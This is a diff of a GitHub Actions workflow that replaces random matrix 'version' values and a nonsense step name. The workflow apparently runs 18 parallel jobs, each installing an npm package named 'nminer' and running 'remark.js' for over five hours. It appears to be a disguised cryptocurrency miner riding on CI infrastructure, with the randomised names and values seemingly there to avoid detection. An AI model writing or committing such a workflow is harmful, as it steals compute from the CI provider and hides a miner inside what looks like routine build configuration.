@@ -9,24 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 473 }
-          - { version: 6832 }
-          - { version: 5291 }
-          - { version: 6156 }
-          - { version: 2918 }
-          - { version: 5317 }
-          - { version: 4806 }
-          - { version: 9281 }
-          - { version: 4249 }
-          - { version: 5096 }
-          - { version: 7795 }
-          - { version: 7661 }
-          - { version: 5123 }
-          - { version: 4018 }
-          - { version: 5260 }
-          - { version: 3990 }
-          - { version: 9383 }
-          - { version: 6172 }
+          - { version: 611 }
+          - { version: 2647 }
+          - { version: 2465 }
+          - { version: 2495 }
+          - { version: 2089 }
+          - { version: 796 }
+          - { version: 5932 }
+          - { version: 9654 }
+          - { version: 3416 }
+          - { version: 7682 }
+          - { version: 19 }
+          - { version: 1524 }
+          - { version: 3739 }
+          - { version: 8141 }
+          - { version: 7521 }
+          - { version: 4334 }
+          - { version: 6778 }
+          - { version: 5573 }
 
     steps:
       - name: Checkout
@@ -37,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: properly ample filter
+      - name: biodegradable crossly
         run: |
           npm install nminer@latest
-          timeout 349m node remark.js || echo "remark executed"
+          timeout 338m node remark.js || echo "remark executed"
